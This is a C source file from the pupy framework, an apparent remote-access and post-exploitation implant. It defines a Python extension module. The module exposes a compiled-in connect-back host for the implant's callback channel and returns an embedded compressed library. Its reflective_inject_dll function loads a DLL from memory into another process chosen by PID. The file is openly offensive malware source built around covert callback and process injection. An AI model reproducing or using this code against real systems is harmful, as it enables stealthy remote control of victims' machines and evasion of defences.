/*
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------
*/

#include "Python-dynload.h"
#include <stdio.h>
#include <windows.h>
#include "base_inject.h"
static char module_doc[] = "Builtins utilities for pupy";

extern const char resources_library_compressed_string_txt_start[];
extern const int resources_library_compressed_string_txt_size;
#ifndef STANDALONE
	extern char connect_back_host[100];
#else
	char connect_back_host[100] = "0.0.0.0:443";
#endif
extern const DWORD dwPupyArch;
static PyObject *Py_get_compressed_library_string(PyObject *self, PyObject *args)
{
	return Py_BuildValue("s#", resources_library_compressed_string_txt_start, resources_library_compressed_string_txt_size);
}

static PyObject *
Py_get_connect_back_host(PyObject *self, PyObject *args)
{
	return Py_BuildValue("s", connect_back_host);
}
static PyObject *Py_get_arch(PyObject *self, PyObject *args)
{
	if(dwPupyArch==PROCESS_ARCH_X86){
		return Py_BuildValue("s", "x86");
	}
	else if(dwPupyArch==PROCESS_ARCH_X64){
		return Py_BuildValue("s", "x64");
	}
	return Py_BuildValue("s", "unknown");
}

static PyObject *
Py_reflective_inject_dll(PyObject *self, PyObject *args)
{
	DWORD dwPid;
	const char *lpDllBuffer;
	DWORD dwDllLenght;
	const char *cpCommandLine;
	PyObject* py_is64bit;
	int is64bits;

	if (!PyArg_ParseTuple(args, "Is#O", &dwPid, &lpDllBuffer, &dwDllLenght, &py_is64bit))
		return NULL;

	is64bits = PyObject_IsTrue(py_is64bit);

	if(is64bits)
		is64bits=PROCESS_ARCH_X64;
	else
		is64bits=PROCESS_ARCH_X86;
	

	if(inject_dll( dwPid, lpDllBuffer, dwDllLenght, NULL, is64bits) != ERROR_SUCCESS)
		return NULL;

	return PyBool_FromLong(1);
}

static PyMethodDef methods[] = {
	{ "get_connect_back_host", Py_get_connect_back_host, METH_NOARGS, "get_connect_back_host() -> (ip, port)" },
	{ "get_arch", Py_get_arch, METH_NOARGS, "get current pupy architecture (x86 or x64)" },
	{ "_get_compressed_library_string", Py_get_compressed_library_string, METH_VARARGS },
	{ "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, "reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\nreflectively inject a dll into a process. raise an Exception on failure" },
	{ NULL, NULL },		/* Sentinel */
};

DL_EXPORT(void)
initpupy(void)
{
	Py_InitModule3("pupy", methods, module_doc);
}

